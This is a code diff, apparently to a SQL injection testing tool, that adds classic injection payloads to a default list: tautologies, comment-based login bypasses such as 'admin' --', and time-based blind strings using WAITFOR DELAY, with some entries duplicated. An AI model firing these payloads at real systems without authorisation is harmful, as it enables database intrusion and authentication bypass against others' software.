@@ -10,8 +10,26 @@ except ImportError:
 # Default SQLi payloads
 default_sqli_payloads = [
     "'",
+    "''",
     "' OR '1'='1",
-    # Add more default payloads as needed
+    "' OR '1'='1' --",
+    "' OR '1'='1' /*",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "admin' --",
+    "admin' #",
+    "admin'/*",
+    "' OR '1'='1'{",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "admin' --",
+    "admin' #",
+    "admin'/*",
+    "1' WAITFOR DELAY '0:0:5'--",
+    "1'; WAITFOR DELAY '0:0:5'--",
+    # Add more payloads as needed
 ]
 
 # Default error indicators
